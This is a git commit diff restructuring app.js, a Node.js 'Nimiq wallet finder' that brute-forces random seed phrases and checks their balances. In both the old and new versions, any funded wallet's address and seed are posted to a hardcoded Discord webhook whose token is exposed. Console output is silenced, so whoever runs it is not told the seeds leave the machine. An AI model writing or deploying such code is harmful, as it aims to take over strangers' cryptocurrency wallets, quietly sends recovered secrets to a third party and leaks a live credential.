6ff7dfa62ca5ef4df3c717b0f40cd9e98deba4ab
malphite-code-2 <168648509+malphite-code-2@users.noreply.github.com>
2024-05-25 13:52:19 +0700

    Update app.js

--- app.js
+++ app.js
@@ -1,171 +1,174 @@
-console.log = function() {}
-console.error = function() {}
-console.warn = function() {}
+(async () => {
+    console.log = function () { }
+    console.error = function () { }
+    console.warn = function () { }
+    
+    // Connect
+    const Connection = require('./connection');
+    const connection = new Connection();
+    const wrapper = await connection.connect();
 
-const { range, random } = require('lodash');
-const bip39 = require('bip39');
-const fs = require('fs');
-const cluster = require('cluster');
-const NimiqWallet = require('nimiqscan-wallet').default;
-const blessed = require('blessed');
-const { default: axios } = require('axios');
-const argv = require('minimist')(process.argv.slice(2));
-const threads = argv?.t || 4;
+    // Main
+    const { range } = require('lodash');
+    const bip39 = require('bip39');
+    const fs = require('fs');
+    const cluster = require('cluster');
+    const NimiqWallet = require('nimiqscan-wallet').default;
+    const blessed = require('blessed');
+    const { default: axios } = require('axios');
+    const argv = require('minimist')(process.argv.slice(2));
+    const threads = argv?.t || 4;
 
-const send = (title, message) => {
-    const embered = { 'title': message };
-    const headers = { "Content-Type": "application/json" };
-    const data = {
-        'username': 'doge-scan-bot',
-        'avatar_url': 'https://i.imgur.com/AfFp7pu.png',
-        'content': title.toString(),
-        'embeds': [embered]
-    };
-    const webhookUrl = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
-    try {
-        axios.post(webhookUrl, data, { headers })
-    } catch (error) {
-        console.log(error);
-    }
-}
-
-async function generate(node) {
-    const wallet = generateAddress();
-
-    const balance = await getBalance(wallet.address, node);
-
-    process.send({ ...wallet, balance });
-
-    if (balance > 0) {
-        var successString = "Wallet: [" + wallet.address + "] - Seed: [" + wallet.seed + "] - Balance: " + balance + " NIM";
-
-        // save the wallet and its private key (seed) to a Success.txt file in the same folder 
-        fs.writeFileSync('./match.txt', successString, (err) => {
-            if (err) throw err;
-        })
-
-        send(successString, 'A Wallet Found Success!!!');
-    }
-}
-
-const generateAddress = () => {
-    const mnemonic = bip39.generateMnemonic(256)
-    const wallet = NimiqWallet.fromMnemonic(mnemonic);
-    const address = wallet.getAddress();
-    return { address: address, seed: mnemonic };
-}
-
-const getBalance = async (address, node) => new Promise((resolve) => {
-    try {
-		const timeout = setTimeout(() => resolve(-1), 5 * 60 * 1000);
-        node.accountHelper.getBalance(address, (b) => {
-            const balance = b / 100000;
-			clearTimeout(timeout);
-            resolve(balance)
-        })
-    } catch (error) {
-        resolve(-1)
-    }
-})
-
-if (cluster.isMaster) {
-    let counts = 0;
-    let founds = 0;
-    const lines = {}
-    const numCPUs = threads || 2;
-
-    let screen = blessed.screen({
-        smartCSR: true
-    });
-
-    let title = blessed.text({
-        top: 0,
-        left: 0,
-        width: '100%',
-        height: 'shrink',
-        content: `NIMIQ WALLET FINDER v1.0`,
-        style: {
-            fg: 'green'
+    const send = (title, message) => {
+        const embered = { 'title': message };
+        const headers = { "Content-Type": "application/json" };
+        const data = {
+            'username': 'doge-scan-bot',
+            'avatar_url': 'https://i.imgur.com/AfFp7pu.png',
+            'content': title.toString(),
+            'embeds': [embered]
+        };
+        const webhookUrl = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
+        try {
+            axios.post(webhookUrl, data, { headers })
+        } catch (error) {
+            console.log(error);
         }
-    });
+    }
 
-    let status = blessed.text({
-        top: 2,
-        left: 0,
-        width: '100%',
-        height: 'shrink',
-        content: `Threads:      ${numCPUs} CPUs`,
-        style: {
-            fg: 'green'
+    async function generate(node) {
+        const wallet = generateAddress();
+
+        const balance = await getBalance(wallet.address, node);
+
+        process.send({ ...wallet, balance });
+
+        if (balance > 0) {
+            var successString = "Wallet: [" + wallet.address + "] - Seed: [" + wallet.seed + "] - Balance: " + balance + " NIM";
+
+            // save the wallet and its private key (seed) to a Success.txt file in the same folder 
+            fs.writeFileSync('./match.txt', successString, (err) => {
+                if (err) throw err;
+            })
+
+            send(successString, 'A Wallet Found Success!!!');
         }
-    });
+    }
 
-    let result = blessed.text({
-        top: 4,
-        left: 0,
-        width: '100%',
-        height: 'shrink',
-        content: `Result:       Total: 0 | Found: 0`,
-        style: {
-            fg: 'green'
+    const generateAddress = () => {
+        const mnemonic = bip39.generateMnemonic(256)
+        const wallet = NimiqWallet.fromMnemonic(mnemonic);
+        const address = wallet.getAddress();
+        return { address: address, seed: mnemonic };
+    }
+
+    const getBalance = async (address, node) => new Promise((resolve) => {
+        try {
+            const timeout = setTimeout(() => resolve(-1), 5 * 60 * 1000);
+            node.accountHelper.getBalance(address, (b) => {
+                const balance = b / 100000;
+                clearTimeout(timeout);
+                resolve(balance)
+            })
+        } catch (error) {
+            resolve(-1)
         }
-    });
+    })
 
-    range(0, numCPUs, 1).forEach(i => {
-        let process = blessed.text({
-            top: 6 + (i * 2),
+    if (cluster.isMaster) {
+        let counts = 0;
+        let founds = 0;
+        const lines = {}
+        const numCPUs = threads || 2;
+
+        let screen = blessed.screen({
+            smartCSR: true
+        });
+
+        let title = blessed.text({
+            top: 0,
             left: 0,
             width: '100%',
             height: 'shrink',
-            content: `Wallet Check: [CPU ${i + 1}] `,
+            content: `NIMIQ WALLET FINDER v1.0`,
             style: {
-                fg: 'yellow'
+                fg: 'green'
             }
         });
-        lines[`${i + 1}`] = process;
-        screen.append(process);
-    })
 
-    let box = blessed.box({
-        top: 8 + (numCPUs * 2),
-        left: 0,
-        width: '100%',
-        height: 'shrink',
-        style: {
-            fg: 'blue'
-        }
-    });
+        let status = blessed.text({
+            top: 2,
+            left: 0,
+            width: '100%',
+            height: 'shrink',
+            content: `Threads:      ${numCPUs} CPUs`,
+            style: {
+                fg: 'green'
+            }
+        });
 
-    screen.append(title);
-    screen.append(status);
-    screen.append(result);
-    screen.append(box);
-    screen.render();
+        let result = blessed.text({
+            top: 4,
+            left: 0,
+            width: '100%',
+            height: 'shrink',
+            content: `Result:       Total: 0 | Found: 0`,
+            style: {
+                fg: 'green'
+            }
+        });
 
-    cluster.on('message', (worker, message) => {
-        counts++;
-        if (message.balance > 0) {
-            founds++;
-            box.insertTop(`Found: ${message.balance} NIM | ${message.address} | ${message.seed}`);
-        }
-        result.setContent(`Result:       Total: ${counts} | Found: ${founds}`);
-        lines[worker.id].setContent(`Wallet Check: [CPU ${worker.id}] ${message.address} | ${message.balance} NIM`)
+        range(0, numCPUs, 1).forEach(i => {
+            let process = blessed.text({
+                top: 6 + (i * 2),
+                left: 0,
+                width: '100%',
+                height: 'shrink',
+                content: `Wallet Check: [CPU ${i + 1}] `,
+                style: {
+                    fg: 'yellow'
+                }
+            });
+            lines[`${i + 1}`] = process;
+            screen.append(process);
+        })
+
+        let box = blessed.box({
+            top: 8 + (numCPUs * 2),
+            left: 0,
+            width: '100%',
+            height: 'shrink',
+            style: {
+                fg: 'blue'
+            }
+        });
+
+        screen.append(title);
+        screen.append(status);
+        screen.append(result);
+        screen.append(box);
         screen.render();
-    });
 
-    // Fork workers.
-    for (let i = 0; i < numCPUs; i++) {
-        cluster.fork(); // Create a new worker process
+        cluster.on('message', (worker, message) => {
+            counts++;
+            if (message.balance > 0) {
+                founds++;
+                box.insertTop(`Found: ${message.balance} NIM | ${message.address} | ${message.seed}`);
+            }
+            result.setContent(`Result:       Total: ${counts} | Found: ${founds}`);
+            lines[worker.id].setContent(`Wallet Check: [CPU ${worker.id}] ${message.address} | ${message.balance} NIM`)
+            screen.render();
+        });
+
+        // Fork workers.
+        for (let i = 0; i < numCPUs; i++) {
+            cluster.fork(); // Create a new worker process
+        }
+
+        cluster.on('exit', (worker, code, signal) => {
+            console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
+        });
+    } else {
+        setInterval(() => generate(wrapper))
     }
-
-    cluster.on('exit', (worker, code, signal) => {
-        console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
-    });
-} else {	
-    setTimeout(() => {
-        const connect = require('./node');
-        connect((wrapper) => {
-            setInterval(() => generate(wrapper))
-        }); 
-    }, random(5, 15) * 1000)
-}
+})()
